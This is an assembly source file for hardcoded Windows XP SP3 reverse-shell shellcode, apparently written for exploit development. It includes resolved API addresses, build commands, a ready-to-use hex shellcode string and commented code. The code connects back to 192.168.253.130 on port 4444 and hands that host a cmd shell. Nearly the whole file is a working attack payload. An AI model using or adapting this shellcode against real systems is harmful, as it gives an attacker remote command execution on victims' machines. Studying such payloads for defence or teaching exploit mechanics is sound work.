; Windows XP SP3 Eng Hardcoded Reverse shell (92 bytes)
;
; Author: Daniel Solstad (dsolstad.com)
;
; Finding addresses of system calls: 
;   > arwin.exe ws2_32.dll bind
;   arwin - win32 address resolution program - by steve hanna - v.01
;   bind is located at 0x71ab4480 in ws2_32.dll
;
; Finding out which dlls target exe file loads by itself:
;   > tasklist.exe /m /fi "imagename eq vulnerable.exe"
;
; Compiling on Windows:
;   > nasm.exe -f win32 -o shell.obj shell.asm
;   > ld.exe shell.obj -o shell.exe
; 
; Get shellcode string in hex:
;   $ for i in $(objdump -d shell.exe |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
;
; Address table Windows XP SP3 Eng:
;
; ws2_32.dll:       
;  closesocket()           71AB3E2B
;  accept()                71AC1040
;  listen()                71AB8CD3
;  bind()                  71AB4480
;  connect()               71AB4A07
;  WSASocketA()            71AB8B6A
;  WSAStartup()            71AB6A55
;  WSAGetLastError()       71AB3CCE
;
; kernel32.dll:
;  LoadLibraryA()          7C801D7B
;  ExitProcess()           7C81CAFA
;  WaitForSingleObject()   7C802530
;  CreateProcessA()        7C80236B
;  SetStdHandle()          7C81d363
;
; msvcrt.dll:       
;  system()                77C293C7
;
;
; Notes:
;
; * LoadLibraryA() and WSAStartup() needs to be uncommented if run as a standalone executable. 
;   In an exploit environment, ws2_32.dll is probably already loaded and WSAStartup() already called.
;
; * The code can certainly be shorter in size, but for readability and a little more robustness I have kept it like this.
;
;
; Shellcode in hex string (without LoadLibrary and WSAStarup):
;
; \x31\xc0\x50\x50\x50\x50\x6a\x01\x6a\x02\xb8\x6a\x8b\xab\x71\xff\xd0\x89\xc3\x68
; \xc0\xa8\x38\x01\xb8\x02\x01\x11\x5c\xfe\xcc\x50\x89\xe6\x31\xc0\xb0\x10\x50\x56
; \x53\xb8\x07\x4a\xab\x71\xff\xd0\xba\x63\xd3\x81\x7c\x53\x6a\xf6\xff\xd2\x53\x6a
; \xf5\xff\xd2\x53\x6a\xf4\xff\xd2\xc7\x44\x24\xfb\x41\x63\x6d\x64\x8d\x44\x24\xfc
; \x8d\x64\x24\xfc\x50\xb8\xc7\x93\xc2\x77\xff\xd0

[BITS 32]

global _start

section .text

_start:

; LoadLibraryA(_In_ LPCTSTR lpFileName)
;xor eax, eax
;mov ax, 0x3233
;push eax            ; Push 0x00003233 (ASCII 32\0)
;push 0x5f327377     ; Push 0x5f327377 (ASCII ws2_)
;mov ebx, esp        ; Store pointer to "ws2_32" in ebx
;push ebx            ; Arg lpFileName = ebx -> "ws2_32"
;mov eax, 0x7c801d7b
;call eax

; WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
;add esp, 0xFFFFFE70 ; Creating space on stack (400 bytes)
;push esp            ; Arg lpWSAData = top of stack
;push 0x101          ; Arg wVersionRequired = 1.1
;mov eax, 0x71ab6a55
;call eax

; WSASocketA(int af, int type, int protocol, 
;            LPWSAPROTOCOL_INFOA lpProtocolInfo, 
;            GROUP g, DWORD dwFlags)
xor eax, eax
push eax             ; Arg dwFlags = 0
push eax             ; Arg g = 0
push eax             ; Arg lpProtocolInfo = 0
push eax             ; Arg protocol = IPPROTO_TCP
push 0x1             ; Arg type = SOCK_STREAM
push 0x2             ; Arg af = AF_INET
mov eax, 0x71AB8B6A
call eax
mov ebx, eax         ; Store WSASocket() handler

; connect(SOCKET s, const sockaddr *name, int namelen);
push 0x82FDA8C0      ; IP address, 192.168.253.130   
mov eax, 0x5c110102  ; Port nr, 4444 (first 2 bytes) 
dec ah               ; eax: 0x5c110102 -> 0x5c110002 (Mitigating null byte)
push eax             ; Store portnr on stack
mov esi, esp         ; Store pointer to portnr
xor eax, eax
mov al, 0x10
push eax             ; Arg namelen = 16 bytes
push esi             ; Arg *name = esi -> 0x5c110002 (5c11 = 4444, 0002 = INET_AF)
push ebx             ; Arg s = WSASocket() handler
mov eax, 0x71ab4a07
call eax

; SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle)
mov edx, 0x7c81d363

push ebx             ; Arg hHandle = WSASocket() handler
push 0xfffffff6      ; Arg nStdHandle = -0A (STD_INPUT)
call edx
          
push ebx             ; Arg hHandle = WSASocket() handler
push 0xfffffff5      ; Arg nStdHandle = -0B (STD_OUTPUT)
call edx
          
push ebx             ; Arg hHandle = WSASocket() handler        
push 0xfffffff4      ; Arg nStdHandle = -0C (STD_ERROR)
call edx

; system(const char *command)
mov DWORD [esp-0x5], 0x646d6341   ; Store string "Acmd" 5 bytes from top of stack
lea eax, [esp-0x4]                ; Store pointer to the string "cmd\0" in eax
lea esp, [esp-0x4]                ; Manually update esp
push eax                          ; Arg *command = eax -> "cmd"
mov eax, 0x77c293c7
call eax

; Alternative version which saves some bytes using ebp instead of esp.
; We save space because we don't need to update the state of ebp manually.
; The reason I use esp instead is that ebp might get overwritten by the exploit.
; system(const char *command)
;mov DWORD [ebp-0x5], 0x646d6341
;lea eax, [ebp-0x4]
;push eax
;mov eax, 0x77c293c7
;call eax
